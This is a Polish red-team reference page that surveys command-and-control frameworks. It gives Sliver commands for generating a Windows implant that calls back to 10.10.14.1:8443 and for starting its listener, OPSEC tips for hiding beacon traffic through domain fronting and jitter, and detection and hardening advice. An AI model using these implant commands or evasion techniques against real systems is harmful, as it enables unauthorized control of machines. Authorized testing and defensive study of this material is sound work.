---
title: "C2 Frameworks – przegląd"
category: "red-team"
tags: ["c2", "command-and-control", "post-exploitation"]
platform: "agnostic"
mitre: ["T1071", "T1573"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# C2 Frameworks

## TL;DR
Command & Control zarządza implantami po eksploatacji. Wybór wg: kanał (HTTPS/DNS/SMB), profil ruchu (malleable), cena, OPSEC. Używaj wyłącznie w autoryzowanych zaangażowaniach.

## Przegląd
| Framework | Licencja | Mocne strony |
|-----------|----------|--------------|
| Cobalt Strike | komercyjny | standard branżowy, malleable C2, BOF |
| Sliver | open-source | mTLS/DNS/WireGuard, multi-platform, aktywny |
| Mythic | open-source | modularny, wiele agentów, ładny UI |
| Havoc | open-source | nowoczesny, evasion-focused |
| Metasploit | open-source | szybki PoC, meterpreter (głośny) |

## Sliver – szybki start
```bash
# Serwer
sliver-server
# Wygeneruj implant (mTLS)
generate --mtls 10.10.14.1:8443 --os windows --arch amd64 --save impl.exe
# Listener
mtls --lhost 10.10.14.1 --lport 8443
# Po callbacku
sessions
use <id>
```

## Profile / OPSEC
- **Malleable/HTTP profile** upodabnia beacon do legalnego ruchu (nagłówki, jitter, sleep).
- Domain fronting / redirectory (nginx/CDN) ukrywają realny serwer C2.
- Jitter + długi sleep = mniej wzorca beaconingu.

## Wykrywanie (Blue Team)
- **Beaconing**: regularne odstępy połączeń (analiza jitter/entropii), JA3/JA3S fingerprint TLS.
- Domeny młode/rzadkie, DNS o wysokiej entropii (tunel), nietypowe User-Agent.
- Znane profile CS/Sliver — sygnatury sieciowe/EDR.

## Mitygacja / Hardening
- TLS inspection + JA3 blocklist, egress allow-list, DNS monitoring.
- EDR na injection/BOF, blokada nieznanych domen/kategorii.

## Źródła
- [The C2 Matrix](https://www.thec2matrix.com/) · [Sliver](https://github.com/BishopFox/sliver)
